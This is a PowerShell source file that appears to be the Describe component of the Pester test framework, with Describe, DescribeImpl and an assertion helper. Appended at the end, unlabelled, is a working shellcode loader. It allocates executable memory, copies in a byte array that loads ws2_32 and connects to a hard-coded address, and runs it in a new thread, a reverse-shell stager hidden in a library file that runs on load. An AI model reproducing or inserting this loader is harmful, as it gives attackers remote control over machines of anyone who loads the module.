function Describe {
    

    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string] $Name,

        [Alias('Tags')]
        [string[]] $Tag = @(),

        [Parameter(Position = 1)]
        [ValidateNotNull()]
        [ScriptBlock] $Fixture
    )
    if ($Fixture -eq $null) {
        if ($Name.Contains("`n")) {
            throw "Test fixture name has multiple lines and no test fixture is provided. (Have you provided a name for the test group?)"
        }
        else {
            throw 'No test fixture is provided. (Have you put the open curly brace on the next line?)'
        }
    }
    if ($null -eq (& $SafeCommands['Get-Variable'] -Name Pester -ValueOnly -ErrorAction $script:IgnoreErrorPreference)) {
        
        Remove-MockFunctionsAndAliases
        $sessionState = Set-SessionStateHint -PassThru -Hint "Caller - Captured in Describe" -SessionState $PSCmdlet.SessionState
        $Pester = New-PesterState -Path (& $SafeCommands['Resolve-Path'] .) -TestNameFilter $null -TagFilter @() -SessionState $sessionState
        $script:mockTable = @{}
    }

    DescribeImpl @PSBoundParameters -CommandUsed 'Describe' -Pester $Pester -DescribeOutputBlock ${function:Write-Describe} -TestOutputBlock ${function:Write-PesterResult} -NoTestRegistry:('Windows' -ne (GetPesterOs))
}

function DescribeImpl {
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string] $Name,

        [Alias('Tags')]
        $Tag = @(),

        [Parameter(Position = 1)]
        [ValidateNotNull()]
        [ScriptBlock] $Fixture = $(Throw "No test script block is provided. (Have you put the open curly brace on the next line?)"),

        [string] $CommandUsed = 'Describe',

        $Pester,

        [scriptblock] $DescribeOutputBlock,

        [scriptblock] $TestOutputBlock,

        [switch] $NoTestDrive,

        [switch] $NoTestRegistry
    )

    Assert-DescribeInProgress -CommandName $CommandUsed

    if (($Pester.RunningViaInvokePester -and $Pester.TestGroupStack.Count -eq 2) -or
        (-not $Pester.RunningViaInvokePester -and $Pester.TestGroupStack.Count -eq 1)) {
        if ($Pester.TestNameFilter -and $Name) {
            if (-not (Contain-AnyStringLike -Filter $Pester.TestNameFilter -Collection $Name)) {
                return
            }
        }

        if ($Pester.ScriptBlockFilter) {
            $match = $false
            foreach ($filter in $Pester.ScriptBlockFilter) {
                if ($match) {
                    break
                }

                if ($Fixture.File -eq $filter.Path -and $Fixture.StartPosition.StartLine -eq $filter.Line) {
                    $match = $true
                }
            }

            if (-not $match) {
                return
            }
        }

        if ($Pester.TagFilter) {
            if (-not (Contain-AnyStringLike -Filter $Pester.TagFilter -Collection $Tag)) {
                return
            }
        }

        if ($Pester.ExcludeTagFilter) {
            if (Contain-AnyStringLike -Filter $Pester.ExcludeTagFilter -Collection $Tag) {
                return
            }
        }
    }
    else {
        if ($PSBoundParameters.ContainsKey('Tag')) {
            Write-Warning "${CommandUsed} '$Name': Tags are only effective on the outermost test group, for now."
        }
    }

    $Pester.EnterTestGroup($Name, $CommandUsed)

    if ($null -ne $DescribeOutputBlock) {
        & $DescribeOutputBlock $Name $CommandUsed
    }

    $testDriveAdded = $false
    $testRegistryAdded = $false
    try {
        try {
            if (-not $NoTestDrive) {
                if (-not (Test-Path TestDrive:\)) {
                    New-TestDrive
                    $testDriveAdded = $true
                }
                else {
                    $TestDriveContent = Get-TestDriveChildItem
                }
            }

            if (-not $NoTestRegistry) {
                if (-not (Test-Path TestRegistry:\)) {
                    New-TestRegistry
                    $testRegistryAdded = $true
                }
                else {
                    $TestRegistryContent = Get-TestRegistryChildItem
                }
            }

            Add-SetupAndTeardown -ScriptBlock $Fixture
            Invoke-TestGroupSetupBlocks

            do {
                Write-ScriptBlockInvocationHint -Hint "Describe Fixture" -ScriptBlock $Fixture
                $null = & $Fixture
            } until ($true)
        }
        finally {
            Invoke-TestGroupTeardownBlocks

            if (-not $NoTestDrive) {
                if ($testDriveAdded) {
                    Remove-TestDrive
                }
                else {
                    Clear-TestDrive -Exclude ($TestDriveContent | & $SafeCommands['Select-Object'] -ExpandProperty FullName)
                }
            }

            if (-not $NoTestRegistry) {
                if ($testRegistryAdded) {
                    Remove-TestRegistry
                }
                else {
                    Clear-TestRegistry -Exclude ($TestRegistryContent | & $SafeCommands['Select-Object'] -ExpandProperty PSPath)
                }
            }
        }
    }
    catch {
        $firstStackTraceLine = $_.InvocationInfo.PositionMessage.Trim() -split "$([System.Environment]::NewLine)" | & $SafeCommands['Select-Object'] -First 1
        $Pester.AddTestResult("Error occurred in $CommandUsed block", "Failed", $null, $_.Exception.Message, $firstStackTraceLine, $null, $null, $_)
        if ($null -ne $TestOutputBlock) {
            & $TestOutputBlock $Pester.TestResult[-1]
        }
    }

    Exit-MockScope

    $Pester.LeaveTestGroup($Name, $CommandUsed)
}


function Assert-DescribeInProgress {
    param ($CommandName)
    if ($null -eq $Pester) {
        throw "The $CommandName command may only be used from a Pester test script."
    }
}

$U5v = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $U5v -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc5,0x1c,0x55,0x0e,0x68,0x02,0x00,0x01,0xb1,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Syi=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Syi.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Syi,0,0,0);for (;;){Start-sleep 60};

